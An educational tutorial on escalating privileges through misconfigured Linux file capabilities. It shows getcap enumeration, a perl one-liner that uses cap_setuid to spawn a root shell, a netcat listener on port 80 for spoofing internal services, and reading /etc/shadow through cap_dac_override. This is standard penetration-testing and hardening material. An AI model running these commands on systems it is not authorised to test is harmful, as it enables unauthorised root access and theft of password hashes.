Linux capabilities split root privileges into smaller, assignable units. Instead of running a binary as full root (via SUID), a process can be granted only the specific privileges it needs.

This reduces risk in theory, but in practice, **misconfigured capabilities can lead to full privilege escalation**, especially when applied to interpreters or flexible binaries.

Capabilities are stored as extended attributes on files and are applied at execution time.

---

## Capability assignment and execution context

### Understanding effective privileges

When a binary has capabilities assigned, they are applied when the binary is executed. The most relevant flags are:

- `+e` (effective): capability is active during execution
    
- `+p` (permitted): capability can be used by the process
    

Example:

```bash
/usr/bin/perl = cap_setuid+ep
```

This means:

- The binary can change its UID (`cap_setuid`)
    
- The capability is active when executed
    

---

## Identifying exploitable capabilities

### Manual enumeration

To find binaries with capabilities:

```bash
getcap -r / 2>/dev/null
```

Example output:

```text
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
```

Not all capabilities are useful for escalation. The most interesting ones include:

- `cap_setuid`
    
- `cap_setgid`
    
- `cap_sys_admin`
    
- `cap_dac_override`
    

These allow actions that bypass normal permission checks.

---

## Exploiting cap_setuid 

When a binary has the `cap_setuid` capability, it can change its effective UID to any user, including root. The key factor is whether the binary allows command execution or scripting.

Instead of guessing how to exploit each binary, the standard approach is to use **GTFOBins**, which provides tested privilege escalation techniques for common Linux binaries.

After enumerating capabilities:

```bash
getcap -r / 2>/dev/null
```

Example result:

```text
/usr/bin/perl = cap_setuid+ep
```

At this point, the workflow is:

1. Identify the binary (`perl`)
    
2. Search for it in GTFOBins
    
3. Use the provided payload adapted to capabilities
    

Typical payload:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Verification:

```bash
id
```

```text
uid=0(root) gid=1000(user)
```



---

## Less obvious but useful capabilities

Not all capabilities lead directly to privilege escalation, but many still provide meaningful advantages during post-exploitation. These capabilities can be leveraged to expand control, pivot, or interact with restricted system resources.

#### cap_net_bind_service

```text
cap_net_bind_service
```

This capability allows a process to bind to privileged ports (below 1024) without requiring root privileges. While this does not elevate privileges by itself, it enables scenarios that would normally be restricted.

For instance, an attacker can bind to port 80 or 443 and impersonate legitimate services:

```bash
nc -lvnp 80
```

This can be used to:

- Capture credentials from misconfigured clients
    
- Perform phishing within internal networks
    
- Replace or spoof internal services during lateral movement
    

#### cap_dac_override

Another relevant example is:

```text
cap_dac_override
```

This capability bypasses file permission checks, allowing access to files that would normally be restricted:

```bash
cat /etc/shadow
```

If assigned to a binary capable of reading files, it can expose sensitive data such as password hashes.
